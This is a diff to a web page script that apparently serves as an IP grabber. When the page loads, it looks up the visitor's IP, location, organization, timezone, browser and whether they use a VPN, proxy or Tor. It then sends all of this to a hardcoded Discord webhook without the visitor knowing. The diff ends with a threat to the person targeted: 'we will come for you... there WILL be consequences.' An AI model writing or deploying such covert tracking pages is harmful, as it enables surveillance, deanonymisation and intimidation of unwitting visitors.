@@ -36,29 +36,45 @@
         <p id="asn"></p>
         <p id="timezone"></p>
         <p id="browser"></p>
+        <p id="vpn"></p>
+        <p id="proxy"></p>
+        <p id="tor"></p>
+        <p id="relay"></p>
+        <p id="hosting"></p>
     </div>
 
     <script>
         async function fetchIPInfo() {
             try {
-                const response = await fetch('https://ipinfo.io/json?token=1710c7628a0e83');
-                const data = await response.json();
+                const ipInfoResponse = await fetch('https://ipinfo.io/json?token=1710c7628a0e83');
+                const ipInfoData = await ipInfoResponse.json();
+
+                // Fetch additional IP data from another service
+                const securityResponse = await fetch(`https://api.ipqualityscore.com/json/?key=YOUR_API_KEY&ip=${ipInfoData.ip}`);
+                const securityData = await securityResponse.json();
 
                 // Display IP info on the page
-                document.getElementById('ip').textContent = `IP: ${data.ip}`;
-                document.getElementById('location').textContent = `Location: ${data.city}, ${data.region}, ${data.country}`;
-                document.getElementById('org').textContent = `Organization: ${data.org}`;
-                document.getElementById('asn').textContent = `ASN: ${data.org.split(' ')[0]}`; // Extract ASN from the org field
-                document.getElementById('timezone').textContent = `Timezone: ${data.timezone}`;
+                document.getElementById('ip').textContent = `IP: ${ipInfoData.ip}`;
+                document.getElementById('location').textContent = `Location: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}`;
+                document.getElementById('org').textContent = `Organization: ${ipInfoData.org}`;
+                document.getElementById('asn').textContent = `ASN: ${ipInfoData.org.split(' ')[0]}`; // Extract ASN from the org field
+                document.getElementById('timezone').textContent = `Timezone: ${ipInfoData.timezone}`;
 
                 // Get and display browser info
                 const browserInfo = getBrowserInfo();
                 document.getElementById('browser').textContent = `Browser: ${browserInfo}`;
 
+                // Display additional security info
+                document.getElementById('vpn').textContent = `VPN: ${securityData.vpn ? 'True' : 'False'}`;
+                document.getElementById('proxy').textContent = `Proxy: ${securityData.proxy ? 'True' : 'False'}`;
+                document.getElementById('tor').textContent = `Tor: ${securityData.tor ? 'True' : 'False'}`;
+                document.getElementById('relay').textContent = `Relay: ${securityData.relay ? 'True' : 'False'}`;
+                document.getElementById('hosting').textContent = `Hosting: ${securityData.hosting ? 'True' : 'False'}`;
+
                 // Send IP info to Discord webhook
                 const webhookUrl = 'https://discord.com/api/webhooks/1256712499789828156/OFojd4Dbe2hapmBIdnCrbuYg1M_USl0W0TvyuPeGdlGgESA4bKrjqaCwd9WN7zLwvl78';
                 const message = {
-                    content: `New visitor IP information:\nIP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nOrganization: ${data.org}\nASN: ${data.org.split(' ')[0]}\nTimezone: ${data.timezone}\nBrowser: ${browserInfo}`
+                    content: `New visitor IP information:\nIP: ${ipInfoData.ip}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nOrganization: ${ipInfoData.org}\nASN: ${ipInfoData.org.split(' ')[0]}\nTimezone: ${ipInfoData.timezone}\nBrowser: ${browserInfo}\nVPN: ${securityData.vpn ? 'True' : 'False'}\nProxy: ${securityData.proxy ? 'True' : 'False'}\nTor: ${securityData.tor ? 'True' : 'False'}\nRelay: ${securityData.relay ? 'True' : 'False'}\nHosting: ${securityData.hosting ? 'True' : 'False'}`
                 };
 
                 await fetch(webhookUrl, {
@@ -99,5 +115,6 @@
     </script>
 </body>
 </html>
+
 
 <h1>Don't run away, because we will come for you. Your best bet is to stay in the groupchat where we can talk. If you leave us, there WILL be consequences.</h1>
